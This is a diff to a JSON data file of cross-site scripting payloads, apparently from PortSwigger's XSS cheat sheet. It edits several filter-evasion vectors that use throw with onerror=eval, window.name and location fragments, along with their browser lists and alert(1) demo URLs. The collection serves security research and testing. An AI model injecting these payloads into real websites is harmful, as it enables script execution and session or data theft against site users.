@@ -154,26 +154,27 @@
   },
   {
     "description": "window.name with onerror and throw",
-    "code": "throw onerror=eval,name",
-    "browsers": ["chrome", "edge"]
+    "code": "<script>throw onerror=eval,name</script>",
+    "browsers": ["chrome", "edge"],
+    "url": "http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ename=%22=alert(1)%22;location=%22https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,name%3C%5C/script%3E%22%3C/script%3E"
   },
   {
     "description": "location with onerror and throw",
-    "code": "throw onerror=eval,'/*'+location",
+    "code": "<script>throw onerror=eval,'/*'+location</script>",
     "browsers": ["chrome", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,%27/*%27%2blocation%3C/script%3E#*/=alert(1)"
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,%27/*%27%2blocation%3C/script%3E#*/=alert(1)//"
   },
   {
     "description": "SVG with onerror, throw and document.URL",
     "code": "<svg onload=\"throw top.onerror=eval,'/*'+URL\">",
     "browsers": ["chrome", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,%27/*%27%2bURL%22%3E#*/=alert(1)"
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,%27/*%27%2bURL%22%3E#*/=alert(1)//"
   },
   {
     "description": "body with onerror, throw and location",
     "code": "<body onload=\"throw onerror=eval,'/*'+location\">",
     "browsers": ["chrome", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,%27/*%27%2blocation%22%3E#*/=alert(1)"
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,%27/*%27%2blocation%22%3E#*/=alert(1)//"
   },
   {
     "description": "window.name with onerror and throw on Firefox",
@@ -185,13 +186,13 @@
     "description": "SVG with onerror, throw and document.URL on Firefox",
     "code": "<svg onload=\"throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}\">",
     "browsers": ["firefox"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2bURL}%22%3E#*/alert(1)"
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2bURL}%22%3E#*/alert(1)//"
   },
   {
     "description": "body with onerror, throw and location on Firefox",
     "code": "<body onload=\"throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}\">",
     "browsers": ["firefox"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2blocation}%22%3E#*/alert(1)"
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2blocation}%22%3E#*/alert(1)//"
   },
   {
     "description": "ondevicemotion and URIError object",
